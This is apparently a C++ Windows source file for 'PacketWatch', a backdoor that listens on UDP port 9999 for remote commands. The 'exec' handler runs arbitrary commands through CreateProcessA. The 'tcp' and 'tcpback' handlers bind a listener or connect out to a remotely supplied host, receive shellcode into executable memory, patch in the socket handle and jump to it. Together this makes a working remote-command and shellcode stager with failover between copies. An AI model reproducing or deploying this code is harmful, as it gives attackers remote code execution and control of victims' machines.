
#include "stdafx.h"
#include "packetwatch.h"
#include <ctime>

#pragma comment (lib, "Ws2_32.lib")

PacketWatch::PacketWatch()
{
	master = false;
}

PacketWatch::~PacketWatch()
{
}

void packetwatch_trampoline(PacketWatch *p) {
	std::cout << "trampoline with pointer of" << p << "\n";
	p->mymain(NULL);
}

void PacketWatch::start()
{
	std::cout << "starting PacketWatch Thread\n";
	mythread = CreateThread(
		NULL,
		0,
		(PTHREAD_START_ROUTINE)packetwatch_trampoline,
		this,
		0,
		0
	);
}

DWORD WINAPI PacketWatch::mymain(LPVOID lpParam)
{
	//I am the master of the thread created in start
	// Note that the udp socket example is from: 
	// https://social.msdn.microsoft.com/Forums/en-US/f7402dfa-405c-4b6d-95d8-3d10530d8120/using-server-and-a-client-with-udp?forum=Vsexpressvc


	//Init Winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET socketS;

	struct sockaddr_in local;
	struct sockaddr_in from;
	struct sockaddr_in serverInfo;
	int srvlen = sizeof(serverInfo);
	int fromlen = sizeof(from);

	timeval timeout;
	timeout.tv_sec = 5;

	clock_t lpsawt;
	int failcount = 0;
	lpsawt = clock();

	FD_SET fds;
	int total;

	socketS = 0;

	master = false;

	while (1 == 1) {

		if (!socketS) {  // Need to test if socket is stilll good here.
			socketS = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);  // Not sure why protocol parm is zero, but from example so going with it.

			if (master == TRUE) {
				//would connect, but udp doesn't need to.
			}
			else {
				local.sin_family = AF_INET;
				local.sin_port = htons(9999);
				local.sin_addr.s_addr = INADDR_ANY;

				if (bind(socketS, (sockaddr*)&local, sizeof(local)) == SOCKET_ERROR) {
					std::cout << "bind failed.\n";
					//possibly become master, possibly quit.  for now zero the socket.
					closesocket(socketS);
					socketS = 0;
					Sleep(5000);
				}
			}
		}



		//MessageBox(NULL, (LPCWSTR)L"Thread Ran", (LPCWSTR)L"Caption", MB_OK);
		//std::cout << "PacketWatch::mymain Thread Ran\n";
		//Sleep(5000);

		if (socketS) {

			if (master) {

				std::cout << "Am I really Master?\n";

				//connect to the client on localhost 9999
				serverInfo.sin_family = AF_INET;
				serverInfo.sin_port = htons(9999);

				char destinationstr[] = "127.0.0.1";
				InetPtonA(AF_INET, destinationstr, (VOID *)&(serverInfo.sin_addr));

				strncpy_s(buffer, 2048, "Master Lives\x00", sizeof("Master Lives\x00"));


				//This result should be failing when the port isn't listening.  Why isn't it?

				int result = sendto(socketS, buffer, strlen(buffer), 0, (sockaddr *)&serverInfo, srvlen);
				if (result == SOCKET_ERROR) {
					if (WSAGetLastError() == WSAECONNRESET) {
						//Assuming reset error is correct.
						//spin up another client.
						std::cout << "Starting a client.\n";
						failcount = 0;
						lpsawt = clock();
					}
					else {
						std::cout << "Socket error that wasn't connreset.\n";
					}
				}
				std::cout << "Sendto result was: " << result << "\n";
				//Master only sends packets every once in a while.
				Sleep(5000);
			}
			else {

				ZeroMemory(buffer, sizeof(buffer));
				//std::cout << "PacketWait - Waiting for packet.\n";

				//This is stuff left over where trying to do select stuff.
				//https://stackoverflow.com/questions/9596014/select-sometimes-does-not-wait
				//Have to do a lastpacketseenatwhattime scenario

				FD_ZERO(&fds);
				FD_SET(socketS, &fds);

				if ((total = select(100, &fds, NULL, NULL, &timeout) == SOCKET_ERROR)) {
					std::cout << "Select failed.\n";
				}

				if (FD_ISSET(socketS, &fds)) {
					std::cout << "Got Packet per select.\n";

					if (recvfrom(socketS, buffer, sizeof(buffer), 0, (sockaddr *)&from, &fromlen) != SOCKET_ERROR)
					{
						if (strncmp(buffer, "Master Lives", strlen("Master Lives")) == 0) {
							failcount = 0;
							lpsawt = clock();
							std::cout << "Master heart received\n";
						}
						else if (strncmp(buffer, "action_1", strlen("action_1")) == 0) {
							action_1();
						}
						else if (strncmp(buffer, "action_2", strlen("action_2")) == 0) {
							action_2();
						}
						else if (strncmp(buffer, "exec ", strlen("exec ")) == 0) {
							RunCommand();
						}
						else if (strncmp(buffer, "tcp ", strlen("tcp ")) == 0) {
							OpenTCPPayloadListener();
						}
						else if (strncmp(buffer, "tcpback ", strlen("tcpback ")) == 0) {
							SetUpBackCaller(buffer);
						}
						else {
							std::cout << "PacketWait - Got an unknown packet\n";
							std::cout << "Buffer: " << buffer << "\n";
						}
					}
				}
				else {
					//Select returned without a recv packet.  Could be a timeout.
					if (((clock() - lpsawt) / CLOCKS_PER_SEC) > 5) {
						if (failcount > 4) {
							//Missed Master too many times.
							//I am now master. Note that socketS = 0 will spin up client when 
							closesocket(socketS);
							socketS = 0;
							failcount = 0;
							master = true;
							std::cout << "Packetwait - Master assumed.\n";
						}
						else {
							lpsawt = clock();
							failcount++;
							std::cout << "Packetwait - Hearbeat has failed " << failcount << " times.\n";
						}
					}
					else {
					//	std::cout << "Select but no timeout.  lpsawd: " << lpsawt << " Clock: " << clock() << "\n";
					}
				}
			}
		}
		else {
			std::cout << "Packetwait probably not master\n";
		}
	}
	closesocket(socketS);
	return 0;
}

void PacketWatch::action_1() {
	std::cout << "Action 1 initiated\n";
}

void PacketWatch::action_2() {
	std::cout << "Action 2 initiated\n";
}


void TCPThread(int *port) {
	std::cout << "TCPThread for port " << *port << "\n";
	//Bind Socket
	SOCKET socketS;

	struct sockaddr_in local;
	struct sockaddr_in from;
	int fromlen = sizeof(from);
	local.sin_family = AF_INET;
	local.sin_port = htons(*port);
	local.sin_addr.s_addr = INADDR_ANY;

	socketS = socket(AF_INET, SOCK_STREAM, 0);  // Not sure why protocol parm is zero, but from example so going with it.
	bind(socketS, (sockaddr *)&local, sizeof(local));

	// Listen for connections
	int iResult = listen(socketS, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		std::cerr << "listen failed with error: " << WSAGetLastError() << "\n";
		closesocket(socketS);
		return;
	}

	// Accept a client socket
	SOCKET ClientSocket = accept(socketS, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		std::cerr << "accept failed with error:" << WSAGetLastError() << "\n";
		closesocket(socketS);
		return;
	}

	// Receive the payload
	/* read the 4-byte length */
	int size;
	int count = recv(ClientSocket, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		std::cerr << "read a strange or incomplete length value\n";
	
	/* allocate a RWX buffer */ 
	char *buffer = (char *)VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
	
	if (buffer == NULL)
		std::cerr << "could not allocate buffer\n";
	
	/* prepend a little assembly to move our SOCKET value to the EDI register
	thanks mihi for pointing this out    
	BF 78 56 34 12     =>      mov edi, 0x12345678 
	*/
	
	buffer[0] = (char) 0xBF;

	/* copy the value of our socket to the buffer */
	memcpy(buffer + 1, &ClientSocket, 4);

	/* read bytes into the buffer */
	int total = 0;
	while (total < size) {
		count = recv(ClientSocket, buffer + 5 + total, size-total, 0);
		total += count;
	}
	
	/* cast our buffer as a function and call it */
	void(*fp)();
	fp = (void(*)())buffer;
	fp();
}

void BackCallerThread(sockaddr_in *remote) {

	SOCKET socketS;
	int payloadsize;
	char *buffer;

	std::cout << "Made it to the backcaller thread with a port of " << ntohs(remote->sin_port) << "\n";

	socketS = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);  // Not sure why protocol parm is zero, but from example so going with it.


	//connect
	if (connect(socketS, (struct sockaddr *)remote, sizeof(sockaddr_in))) {
		std::cerr << "Error connecting to host.  Error: " << WSAGetLastError() << "\n";
		return;
	}

	//recv size
	int count = recv(socketS, (char *)&payloadsize, 4, 0);

	//Alloc bufferspace
	buffer = (char *)VirtualAlloc(0, payloadsize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	//put code to set edi to socket
	buffer[0] = (char)0xBF;

	//copy the value of our socket to the buffer
	memcpy(buffer + 1, &socketS, 4);


	//recv payload
	int total = 0;
	while (total < payloadsize) {
		count = recv(socketS, buffer + 5 + total, payloadsize - total, 0);
		total += count;
	}

	//call payload (plus edi code)
	void(*fp)();
	fp = (void(*)())buffer;
	fp();
    //Note that if the payload calls exit process (default... this app will exit).  Would be nice to avoid that, but don't know how.
}


void PacketWatch::SetUpBackCaller(char *buffer) {
	//Parse Buffer for connection information
	sockaddr_in *destination;
//	struct hostent *he;
	destination = new sockaddr_in;

	ZeroMemory(destination, sizeof(sockaddr_in));

	//Parse buffer for ip and port
	char *destinationhost = strstr(buffer, " ") + 1;  //Skip past tcpback keyword
	char *portnumstr = strstr(destinationhost, " ") + 1;
	portnumstr[-1] = (char)0; //puts a null over the space (to null terminate the hostname
	portnumstr[strlen(portnumstr) - 1] = (char)0; // Kill the newline char


	std::cout << "Connecting to " << destinationhost << " on port " << portnumstr << "\n";
	/* resolve hostname */
	//if ((he = gethostbyname(destinationhost)) == NULL) {
	//	std::cerr << "Couldn't resolve hoststring\n";
	//	return;
	//}

	/* copy the network address to sockaddr_in structure */
	//memcpy((void *) &(destination->sin_addr), he->h_addr_list[0], he->h_length);
//	destination->sin_addr.s_addr = inet_addr(destinationhost);

	//UNTESTED - inet_addr is suddenly deprectaed.
	InetPton(AF_INET, (PCWSTR)(destinationhost), (VOID *)&(destination->sin_addr));
	destination->sin_port = htons(atoi(portnumstr)); 
	destination->sin_family = AF_INET;

	//Create Thread for Listener
	HANDLE tcpthread = CreateThread(
		NULL,
		0,
		(PTHREAD_START_ROUTINE)BackCallerThread,
		(LPVOID)destination,
		0,
		0
	);



}

void PacketWatch::OpenTCPPayloadListener() {
	//Parse buffer for port number
	int *portnum;

	char *portnumstr = strstr(buffer, " ");  //Skip past tcp keyword
	portnumstr[strlen(portnumstr) - 1] = (char)0; // Kill the newline char
	portnumstr++; //goto char after ' '

	portnum = new int;
	*portnum = atoi(portnumstr);

	std::cout << "Attempting to listen for payload on port " << *portnum << "\n";

	//Create Thread for Listener
	HANDLE tcpthread = CreateThread(
		NULL,
		0,
		(PTHREAD_START_ROUTINE)TCPThread,
		(LPVOID) portnum,
		0,
		0
	);
}

void PacketWatch::OpenUDPPayloadListener() {

}

void PacketWatch::RunCommand() {
	//Parse Buffer
	//Just read "The system adds a terminating null character to the command-line string to separate the file name from the arguments. This divides the original string into two strings for internal processing."
	char *command = strstr(buffer, " "); //skips past exec keyword
	command[strlen(command)-1] = (char)0; //Kill the newline char
	command++;
	//char* commandline = strstr(commandend, " "); //skips past executable name

	//Execute Command
	//Notes:
	//Must include the full pathname... no path searching
	//must include extension.
	//To run a batch file, you must start the command interpreter; set lpApplicationName to cmd.exe and set lpCommandLine to the following arguments: /c plus the name of the batch file.
	//StartupInfo supports pipes...  Would be nice to put output into the socket and see results.
	std::cout << "Attempting to execute: " << command << "\n";
	
	//stuff needed to run
	//From https://docs.microsoft.com/en-us/windows/desktop/ProcThread/creating-processes
	PROCESS_INFORMATION pi;
	STARTUPINFOA si; //sets handles for child process.  would be interesting to use the socket for this, but not sure I know how.
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	ZeroMemory(&pi, sizeof(pi));

 	if (!CreateProcessA(
		NULL, //Command to run
		command, //Commandline
		0, //process security attributes... may need to carry uac to child here... don't know
		0, //thread Attributes
		FALSE, //Inherit handles
		0, //Creation Flags (priority)
		0, //Environment Null=use same environment as calling process
		0, // working directory, null is same as current process 
		&si, //StartupInfo
		&pi  //process information
		))
	{
		std::cout << "CreateProcess failed: " << GetLastError() << "\n";
	}
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	
}